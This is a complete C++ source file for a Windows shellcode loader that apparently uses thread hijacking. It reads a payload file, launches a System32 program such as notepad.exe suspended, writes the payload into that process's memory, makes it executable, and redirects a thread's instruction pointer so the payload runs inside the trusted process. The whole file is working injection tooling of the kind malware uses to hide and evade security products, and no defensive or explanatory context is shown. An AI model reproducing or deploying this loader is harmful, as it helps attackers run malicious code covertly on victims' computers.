#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <iostream>
#include <iterator>
#include <vector>

std::vector<BYTE> ReadPayload(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return {};
    return std::vector<BYTE>((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: threadHijack.exe <payload.bin> notepad.exe\n";
        return 1;
    }

    std::vector<BYTE> payload = ReadPayload(argv[1]);
    if (payload.empty()) { std::cerr << "[-] Failed to read payload\n"; return 1; }
    std::cout << "[+] Downloaded " << payload.size() << " bytes\n";

    char WnDr[MAX_PATH] = { 0 };
    char lpPath[MAX_PATH] = { 0 };
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        std::cerr << "[-] GetEnvironmentVariableA failed: " << GetLastError() << "\n";
        return 1;
    }
    sprintf_s(lpPath, "%s\\System32\\%s", WnDr, argv[2]);
    std::cout << "[+] Target: " << lpPath << "\n";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        std::cerr << "[-] CreateProcessA failed: " << GetLastError() << "\n";
        return 1;
    }
    HANDLE hProcess = pi.hProcess;
    std::cout << "[+] Created (PID: " << pi.dwProcessId << ")\n";

    LPVOID execMem = VirtualAllocEx(hProcess, NULL, payload.size(),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << "\n"; return 1; }
    std::cout << "[+] Remote memory at: " << execMem << "\n";

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, execMem, payload.data(), payload.size(), &written)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Written " << written << " bytes\n";

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, execMem, payload.size(),
                          PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx failed: " << GetLastError() << "\n";
        return 1;
    }

    DWORD  targetTid = 0;
    HANDLE hThread   = NULL;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te{};
        te.dwSize = sizeof(te);
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pi.dwProcessId) {
                    targetTid = te.th32ThreadID;
                    hThread   = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    break;                      
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }
    if (!hThread) { std::cerr << "[-] No thread found/opened\n"; return 1; }
    std::cout << "[+] Target thread TID: " << targetTid << "\n";


    if (SuspendThread(hThread) == (DWORD)-1) {
        std::cerr << "[-] SuspendThread failed: " << GetLastError() << "\n";
        return 1;
    }

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] GetThreadContext failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Original RIP: " << (void*)ctx.Rip << "\n";

    ctx.Rip = (ULONG_PTR)execMem;
    if (!SetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] SetThreadContext failed: " << GetLastError() << "\n";
        return 1;
    }
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    std::cout << "[+] Thread hijacked  payload will execute\n";
    return 0;
}